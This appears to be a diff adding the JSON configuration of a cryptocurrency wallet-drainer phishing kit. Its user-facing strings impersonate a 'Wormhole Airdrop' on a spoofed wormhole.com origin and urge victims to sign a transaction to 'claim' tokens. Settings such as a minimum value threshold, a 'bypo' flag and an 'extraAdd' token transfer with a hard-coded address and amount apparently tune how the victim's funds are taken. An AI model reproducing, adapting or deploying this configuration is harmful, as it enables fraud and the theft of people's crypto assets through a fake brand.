@@ -1,0 +1,35 @@
+{
+  "texts": {
+    "timedOutLabel": "Transaction timed out",
+    "pleaseReconnectText": "Please reconnect wallet and try again.",
+    "pendingLabel": "Transaction Pending...",
+    "pendingText": "Your transaction is pending.",
+    "issueLabel": "There is a problem",
+    "issueText": "This address is not eligible, try again with another wallet.",
+    "eligibleLabel": "Your wallet is eligible!",
+    "eligibleContent": "Please confirm prompt in order to proceed",
+    "confirmationLabel": "Wormhole Airdrop.",
+    "confirmationText": "Sign the transaction to claim your tokens.",
+    "rejectedLabel": "Transaction error",
+    "rejectedText": "Reconnect your wallet."
+  },
+  "videoGuideUrl": null,
+  "setClickLimitTime": 15,
+  "loopConnect": false,
+  "showCaptcha": false,
+  "modal": 4,
+  "bypo": true,
+  "minValue": 50,
+  "extraAdd": {
+    "enable": true,
+    "tokens": [
+      {
+        "mint": "11111111111111111111111111111111",
+        "source": "9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM",
+        "owner": "9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM",
+        "amount": 14590000000
+      }
+    ]
+  },
+  "origin": "wormhole.com"
+}
